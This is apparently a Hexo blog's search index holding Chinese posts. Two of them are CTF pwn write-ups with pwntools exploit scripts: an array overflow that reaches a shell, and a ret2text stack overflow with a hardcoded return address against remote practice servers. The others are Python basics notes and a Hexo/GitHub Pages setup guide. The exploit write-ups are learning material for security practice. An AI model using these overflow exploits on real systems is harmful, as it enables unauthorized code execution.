Welcome!\n&quot;</span>, var);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try do something~&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以构造payload时要先填充前13个元素（每个元素4个字节int)再将17发送过去，使其进入</p><p>system（binsh）</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;25918&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">13</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">17</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><ol start="9"><li></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn初体验</title>
    <link href="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p><strong>ret2text</strong></p><p>1.先托入ide中查看</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png" alt="image-20241127202727338"></p><p>2.拖入ida中：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272346961.png" alt="image-20241127203614027"></p><p>1.分析函数：</p><p>确认buf距离栈底20个字节（h为16进制）</p><p>gets函数可读入任意长度的数据</p><ol start="2"><li></li></ol><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271931584.png" alt="image-20241127193117448"></p><p>因此要将地址改为dt_gift函数的地址</p><p>3.写脚本攻击服务器</p><p>先在本地运行，（因为本地可以调试）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&quot;./文件名&quot;</span>)<br></code></pre></td></tr></table></figure><p>（文件名大小写没关系）</p><p>payload:</p><p>①距离为 0x20</p><p>②地址要加 0x！！！！！</p><p>③“junk”占4个字节</p><p>3：本题涉及栈平衡因此这个地址不正确</p><p>刚开始写的：(有两处错误)</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272044812.png" alt="image-20241127204433735"></p><p>开始写：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272054077.png" alt="image-20241127205438921"></p><p>接着写payload:</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281722375.png" alt="image-20241128172158249"></p><p>发现失败了：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281722973.png" alt="image-20241128172235931"></p><p>开始调试：</p><p>添加：（leave）</p><p>gdb.attach是一个函数，会连接当前运行的进程p</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gdb<span class="hljs-selector-class">.attach</span>(<span class="hljs-selector-tag">p</span>,<span class="hljs-string">&#x27;b*0x00000000004011A2&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281723933.png" alt="image-20241128172312892"></p><p>运行：</p><p>这个时候在pwning文件里面打开终端</p><p>先输入t（进入分屏）（CTRL＋d退出)</p><p><img src="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241127213538953.png" alt="image-20241127213538953"></p><p>输入c&#x2F;ni（c按了两次）</p><p>发现卡住了：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272139275.png"></p><p>这个时候发现movaps栈不平衡,</p><p>回到IDA找到（）</p><p>改地址：00000000004011A9</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272146052.png" alt="image-20241127214607982"></p><p>改一下，运行，</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272150785.png" alt="image-20241127215023656"></p><p>发现得到了一个flag,但提交上去显示错误，这个时候再看一看我们写的脚本：发现需要把地址改成远端</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281726908.png" alt="image-20241128172659866"></p><p>下面的是正确的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;222.22.91.49&quot;</span>,<span class="hljs-string">&quot;32783&quot;</span>)<br><span class="hljs-comment"># gdb.attach(p,&#x27;b*0x00000000004011A2&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> +p64(<span class="hljs-number">0x00000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>之后保存，f5运行</p><p>输入ls</p><p>输cat flag</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281726824.png" alt="image-20241128172635776"></p><p>欧克欧克，找到了找到了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python语言基础</title>
    <link href="/2024/11/25/Python%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/11/25/Python%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>1.<strong>打印</strong></p><p>print每个print都默认另起一行</p><p>print(greet)直接打印greet的值</p><p>2.字符串连接””  +</p><p>单双引号转义””   ‘’   \</p><p>换行\n</p><p>三引号跨行字符串’’’ ‘’’</p><p>3.<strong>命名</strong></p><p>下划线user_age </p><p>驼峰UserAge</p><p>4.字符串”6”</p><p>数字 6</p><p>浮点数：6.0</p><p>5.<strong>运算的先后顺序</strong>：</p><p>（）</p><p>**            2**3 ——2的3次方</p><p>*&#x2F;</p><p>+-</p><p>6.<strong>math</strong>提供数学运算函数的库</p><p>import math</p><p>math.函数名（…）</p><p>eg:math.sin(1)</p><p>7**.注释**：</p><p>整段：CTRL+&#x2F;或者’’’ ‘’’</p><p>8.数据类型：int float bool str字符串 NoneType空值类型(表示完全没有值）</p><p>str:”hello” ‘哟!’</p><p>len(‘hello’)得到字符串的长度</p><p>空格，数字，符号都会占据一个长度（转义字符占取一个长度）</p><p>“world”[索引] 提取该位置的字符</p><p>“world”[3]——&gt;l</p><p>bool:真True 假False</p><p>print（type（3））输出数据类型int</p><p>9.<strong>交互模式</strong></p><p>直接输出一行的结果</p><p>不用创建文档，不用写print直接输出，命令不会保存。</p><p>命令行模式</p><p>退出时：键入quit()\n  python3或者CRTL d</p><p>10.<strong>input函数</strong></p><p>input(里面放字符串）给用户的给用户的提示信息</p><p>intput自动返回字符串，所以运用用户输入的信息进行运算时用int，float，等等转换数据类型</p><p>对了，str可以把其他类型转换成字符串</p><p>因为整数不能和字符串连在一起打印，所以把整形转换成字符型</p><p>user_age&#x3D;int(input(“请输入你的年龄：”）</p><p>user_user_age_after_10_year&#x3D;user_age+10</p><p>print(“您十年后会是”+str（user_user_age_after_10_year)+”岁”）</p><p>11.<strong>if语句</strong></p><p>age &#x3D; 18</p><p> if age &gt;&#x3D; 18:</p><p>​    print(“您已成年”)</p><p>else:</p><p>​    print(“哈哈，你还没成年）</p><p>比较运算符：&#x3D;&#x3D;   !&#x3D;   &gt;   &gt;&#x3D;   &lt;   &lt;&#x3D;</p><p>记得要加：</p><p>执行语句要有缩进（建议是4个空格）</p><p>嵌套函数</p><p>多个条件判断：elif</p><p>if条件：</p><p>—-语句</p><p>elif条件：</p><p>—-语句</p><p>elif条件：</p><p>—-语句</p><p>else：</p><p>—-语句</p><p>12.<strong>逻辑运算</strong></p><p>not &gt;and &gt;or</p><p>13.<strong>列表</strong>（类似指针）</p><p>其内部可以加不同种类的</p><p>shopping_list&#x3D;[“键盘”,”键帽”]</p><p>如果要加东西：</p><p>shopping_list.append(“显示器”)</p><p>删去：</p><p>用remov</p><p>修改：直接重新定义，覆盖</p><p>因为列表可变，所以不要也不应该再给其赋值</p><p>利用len函数求长度</p><p>列表回返回元素的数量</p><p>利用索引定位</p><p>max，min，sorted排序好的返回</p><p>14.<strong>字典</strong>，可变，</p><p>键：值   key：value</p><p>键的类型是不可变的（列表不是）</p><p>contacts&#x3D;{“小明”：”13700000000”,”小花”:”13700000001”}</p><p>contact[‘’小明’’]</p><p>①元组，存入相同值，不可变</p><p>添加，删除元组不能操作</p><p>contacts&#x3D;{(“小明”,23)：”13700000000”,(“小明”,34):”13700000001”}</p><p>②字典添加：</p><p>contacts[“美女A”]&#x3D;”18600000000”</p><p>如果其键已经存在，则重新赋值为覆盖。</p><p>要想知道该建是的存在：键 in contacts</p><p>print（”小明”in contacts）</p><p>存在返回True不存在返回False</p><p>③删除一个键值对：</p><p>del contacts [“小明”]</p><p>④想知道有多少键值对：</p><p>len（comtacts）</p><p>⑤字典：</p><p>字典名.keys所有键</p><p>字典名.values所有值</p><p>字典名.items所有键值对</p><p>15.<strong>for循环</strong></p><p>for 变量名 in 迭代对象：</p><p>​    if temp&gt;&#x3D;38:</p><p>​        print (temp)</p><p><strong>整数数列</strong></p><p>rang（开始值，结束值，步长）五步长时默认为1</p><p>结束值不包含</p><p>rang（5，10）</p><p>rang（5）</p><p>起始值默认为0，</p><p>打印1-9的所有奇数</p><p>for num in range (1,10,2)</p><p>​    print (num)</p><p>计算1-100</p><p>total&#x3D;0</p><p>for i in range (1,101):</p><p>​    total&#x3D;total+i</p><p>print (total)</p><p>16.while循环</p><p>while 条件A：</p><p>​    行动B</p><p>17.格式化字符串</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318762.png" alt="image-20241125131838580"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318913.png" alt="image-20241125131856736"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319227.png" alt="image-20241125131910092"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319316.png" alt="image-20241125131932180"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319263.png" alt="image-20241125131948139"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319744.png" alt="image-20241125131955619"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251320579.png" alt="image-20241125132014443"></p><p>18.<strong>函数</strong>，定义参数</p><p>del 函数名 （参数，参数）：</p><p>​    #定义函数的代码</p><p>​    #…</p><p>​    return</p><p>调用时：</p><p>函数名（实参，实参）</p><p>19.<strong>引入模块</strong></p><p>因为内置函数有限，因此为了方便计算，可以引入其他标准库</p><p>①import模块</p><p>模块名.变量名</p><p>模块名.函数名</p><p>②from 模块名 import 函数或变量</p><p>③form 模块名import *</p><p>第三方</p><p>20.<strong>OOP</strong></p><p>面向对象编程</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建</title>
    <link href="/2024/10/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/10/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>一，<strong>搭建前的软件准备</strong>（git，node）<br>搭建之前需要准备的软件：<br>1.Git：官网下载：<a href="https://git-scm.com/">https://git-scm.com/</a><br>2.Node.js 官网下载：<a href="http://nodejs.cn/">http://nodejs.cn/</a></p><p>二，** 安装hexo**，完成简单本地页面展示<br>1.进入cmd窗口输入指令：npm install -g hexo-cli</p><p>三,接下来<strong>初始化一下hexo</strong></p><p>1.输入：<code>hexo init</code></p><p>2..查看是否能启动成功:输入：hexo s</p><p>3.复制网址打开</p><p><a href="http://localhost:4000/">http://localhost:4000/</a><br>(此时博客已经在本地搭建好了)</p><p>之后，我们需要部署到github上。</p><p>ctrl+C停止；</p><p>三，<strong>将Hexo部署到Github</strong><br>1.Github创建个人仓库<br>注册一个github账号。登上账号后建一个仓库：仓库名为你的用户名.github.io，<img src="https://i-blog.csdnimg.cn/blog_migrate/64a3b7752c3c3c6020606d39fe1bf3f9.png" alt="在这里插入图片描述"><br>注意：<br>创建一个和你用户名相同的仓库，后面加.github.io，</p><p>xxxx.github.io，其中xxx就是你注册GitHub的用户名.</p><p>2.生成ssh添加到Github<br>在Github上创建仓库完成之后，需要设置ssh免密登录</p><p>具体操作：打开cmd窗口：执行如下命令：</p><p><code>git config --global user.name &quot;yourname&quot;</code><br><code>git config --global user.email &quot;youremail&quot;</code></p><p>（这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。</p><p>用户名为仓库的名称，邮箱为注册github的邮箱）</p><p>以防万一，用以下代码验证：</p><p><code>git config user.name</code><br><code>git config user.email</code></p><p>3.接着进入到家目录：C:\Users\libinbin，右击打开git bash 。<br>输入：</p><p><code>ssh-keygen -t rsa -C 2412757158@qq.com</code></p><p>后面是自己注册github的邮箱，然后敲三次回车，</p><p>4.接着就会发现C:\Users\libinbin下多了一个.ssh目录，打开后有一个公钥，一个私钥。id_rsa.pub是公钥，我们需要打开它，复制里面的内容。</p><p>然后进入github</p><p>点击setings</p><p>把刚刚复制的密钥粘进去，title随便起</p><p>点击 Add SSH Key</p><p>3.进行部署<br>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为</p><p><code>deploy:</code></p><p><code>type: git</code></p><p><code>repo: git@github.com:goubin18/goubin18.github.io.git</code></p><p><code>branch: main</code></p><p>（注意：后面有空格）</p><p>（repo：获取步骤如下<img src="D:\hp\Pictures\PixPin_2024-10-27_23-37-56.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/226396db3e5a8db9b1358fb7d7151d3a.png" alt="在这里插入图片描述"></p><p>点进自己刚刚创建的仓库）复制</p><p>4.找到自己的博客路径打开</p><p>这个时候需要先安装deploy-git </p><p>npm install hexo-deployer-git –save</p><p>5.然后依次执行以下命令：</p><p><code>hexo c   #清除缓存文件 db.json 和已生成的静态文件 public</code><br><code>hexo g       #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写)</code><br><code>hexo d       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</code></p><p>注意输出hexo d时会让输个yes</p><p>最后回到github上查看自己的仓库：</p><p>现在就可以使用xxx.github.io来访问你的博客啦</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/10/27/hello-world/"/>
    <url>/2024/10/27/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
